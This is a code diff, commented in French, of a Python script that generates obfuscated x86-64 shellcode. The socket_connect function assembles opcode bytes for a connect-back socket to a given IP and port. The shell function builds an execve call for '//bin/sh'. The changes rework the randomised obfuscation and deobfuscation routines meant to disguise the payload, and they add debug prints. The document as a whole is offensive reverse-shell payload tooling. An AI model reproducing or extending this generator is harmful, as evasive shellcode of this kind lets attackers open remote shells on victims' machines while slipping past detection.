@@ -225,20 +225,30 @@ def socket_connect(ip, port):
        # print(hex(ip_to_substract[i])[2:])
 
     #print(PAYLOAD)
-    port = hex(socket.htons(int(port)))[:2]
-    port = str(port[-2:])
+    #port = hex(socket.htons(int(port)))[:2]
+    port = hex(socket.htons(int(port)))
+    print("0 :",port)
 
     add_string += "566668" # push
-    add_string += port[2:] + port[:2] # little endian    
+    print("1 :",add_string, port)
+    add_string += str(port[-4:])  
+    print("2 :",add_string, port)
     add_string += "666a02" #AF_INET
     add_string += "4889e6" if r(0,1) else "4831f64801e6" # "mov rsi, rsp" "xor rsi, rsi ; add rsi, rsp"
     add_string += "b218" # mov dl,24
     add_string += call()
 
-    print("1 :",add_string)
+    print("3 :",add_string)
 
+    #Offuscation
     random1 = factorOffus(add_string)
-    of_string = offus(add_string, of_string, random1)
+    of_string = offus(add_string, random1)
+    #Inverse en mirroir tout la chaine pour op code
+    of_string = of_string[::-1]
+
+    PAYLOAD+=of_string
+
+    #Désoffuscation
     deof_string = deOffus(random1, add_string)
     #Inverse en mirroir tout la chaine pour op code
     deof_string = deof_string[::-1]
@@ -279,17 +289,24 @@ def shell():
     offuString = offuString[::-1]
 
     PAYLOAD += "48bb"  #mov rbx, ...
+
+    """
     for i in range(0,15,2):
         sub = offuString[i+1] + offuString[i] 
         PAYLOAD+= sub
+    """
+    PAYLOAD+=offuString
                     #.../bin/bash en hexa offusqué    
+
+    
+    #Déoffucation
+    PAYLOAD += deOffus(factorOffusVar, "0x68732f6e69622f2f") 
+
     PAYLOAD+="4889e7" # mov rdi, rsp
     PAYLOAD+="50" #push rax
     PAYLOAD+="57" #push rdi
     PAYLOAD+="4889e6" #mov rsi, rsp
-
-    #Déoffucation
-    PAYLOAD += deOffus(factorOffusVar, "0x68732f6e69622f2f")   
+  
     #Appel systeme
     PAYLOAD+="b03b" #mov al, 0x3b
     PAYLOAD+= call()
